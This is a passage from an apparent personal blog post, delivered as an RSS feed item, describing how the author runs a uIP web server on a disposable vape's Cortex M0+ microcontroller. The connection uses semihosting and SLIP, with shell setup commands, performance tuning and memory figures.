it&rsquo;s basically disposable:</p><ul><li>24MHz Coretex M0+</li><li>24KiB of Flash Storage</li><li>3KiB of Static RAM</li><li>a few peripherals, none of which we will use.</li></ul><p>You may look at those specs and think that it&rsquo;s not much to work with. I don&rsquo;t blame you, a 10y old phone can barely load google, and this is about 100x slower. I on the other hand see a <em>blazingly</em> fast web server.</p><h2>Getting online<a href="https://bogdanthegeek.github.io#getting-online">#</a></h2><p>The idea of hosting a web server on a vape didn&rsquo;t come to me instantly. In fact, I have been playing around with them for a while, but after writing my post on <a href="https://bogdanthegeek.github.io/blog/insights/jlink-rtt-for-the-masses/">semihosting</a>, the penny dropped.</p><p>If you don&rsquo;t feel like reading that article, semihosting is basically syscalls for embedded ARM microcontrollers. You throw some values/pointers into some registers and call a breakpoint instruction. An attached debugger interprets the values in the registers and performs certain actions. Most people just use this to get some logs printed from the microcontroller, but they are actually bi-directional.</p><p>If you are older than me, you might remember a time before Wi-Fi and Ethernet, the dark ages, when you had to use dial-up modems to get online. You might also know that the ghosts of those modems still linger all around us. Almost all USB serial devices actually emulate those modems: a 56k modem is just 57600 baud serial device. Data between some of these modems was transmitted using a protocol called SLIP (Serial Line Internet Protocol).<sup><a href="https://bogdanthegeek.github.io#fn:2">2</a></sup></p><p>This may not come as a surprise, but Linux (and with some tweaking even macOS) supports SLIP. The <code>slattach</code> utility can make any <code>/dev/tty*</code> send and receive IP packets. All we have to do is put the data down the wire in the right format and provide a virtual tty. This is actually easier than you might imagine, pyOCD can forward all semihosting though a telnet port. Then, we use <code>socat</code> to link that port to a virtual tty:</p><div><pre><code><span><span>pyocd gdb -S -O semihost_console_type<span>=</span>telnet -T <span>$(</span>PORT<span>)</span> <span>$(</span>PYOCDFLAGS<span>)</span> &amp; </span></span><span><span>socat PTY,link<span>=</span><span>$(</span>TTY<span>)</span>,raw,echo<span>=</span> TCP:localhost:<span>$(</span>PORT<span>)</span>,nodelay &amp; </span></span><span><span>sudo slattach -L -p slip -s <span>115200</span> <span>$(</span>TTY<span>)</span> &amp; </span></span><span><span>sudo ip addr add 192.168.190.1 peer 192.168.190.2/24 dev sl0 </span></span><span><span>sudo ip link set mtu <span>1500</span> up dev sl0 </span></span></code></pre></div><p>Ok, so we have a &ldquo;modem&rdquo;, but that&rsquo;s hardly a web server. To actually talk TCP/IP, we need an IP stack. There are many choices, but I went with <a href="https://github.com/adamdunkels/uip/tree/uip-0-9">uIP</a> because it&rsquo;s pretty small, doesn&rsquo;t require an RTOS, and it&rsquo;s easy to port to other platforms. It also, helpfully, comes with a very minimal HTTP server example.</p><p>After porting the SLIP code to use semihosting, I had a working web server&hellip;half of the time. As with most highly optimised libraries, uIP was designed for 8 and 16-bit machines, which rarely have memory alignment requirements. On ARM however, if you dereference a <code>u16 *</code>, you better hope that address is even, or you&rsquo;ll get an exception. The <code>uip_chksum</code> assumed <code>u16</code> alignment, but the script that creates the filesystem didn&rsquo;t. I actually decided to modify a bit the structure of the filesystem to make it a bit more portable. This was my first time working with <code>perl</code> and I have to say, it&rsquo;s quite well suited to this kind of task.</p><h2>Blazingly fast<a href="https://bogdanthegeek.github.io#blazingly-fast">#</a></h2><p>So how fast is a web server running on a disposable microcontroller. Well, initially, not very fast. Pings took ~1.5s with 50% packet loss and a simple page took over 20s to load. That&rsquo;s so bad, it&rsquo;s actually funny, and I kind of wanted to leave it there.</p><p>However, the problem was actually between the seat and the steering wheel the whole time. The first implementation read and wrote a single character at a time, which had a massive overhead associated with it. I previously benchmarked semihosting on this device, and I was getting ~20KiB/s, but uIP&rsquo;s SLIP implementation was designed for very low memory devices, so it was serialising the data byte by byte. We have a whopping 3kiB of RAM to play with, so I added a ring buffer to cache reads from the host and feed them into the SLIP poll function. I also split writes in batches to allow for escaping.</p><p>Now this is what I call blazingly fast! Pings now take 20ms, no packet loss and a full page loads in about 160ms. This was using using almost all of the RAM, but I could also dial down the sizes of the buffer to have more than enough headroom to run other tasks. The project repo has everything set to a nice balance latency and RAM usage:</p><pre><code>Memory region Used Size Region Size %age Used FLASH: 5116 B 24 KB 20.82% RAM: 1380 B 3 KB 44.92% </code></pre><p>For this blog however, I paid for none of the RAM, so I&rsquo;ll use all of the RAM.</p><p>As you may have noticed, we have just under 20kiB (80%) of storage space. That may not be enough to ship all of React, but as you can see, it&rsquo;s more than enough to host this entire blog post. And this is not just a static page server, you can run any server-side code you want, if you know C that is.</p><p>Just for fun, I added a json api endpoint to get the number of requests to the main page (since the last crash) and the unique ID of the microcontroller.</p><h2>Resources<a href="https://bogdanthegeek.github.io#resources">#</a></h2><ul><li><a href="https://github.com/BogdanTheGeek/semihost-ip">Code for this project</a></li></ul></div></section>]]></description><pubDate>Mon, 15 Sep 2025 22:55:15 +0530</pubDate></item></channel></rss>
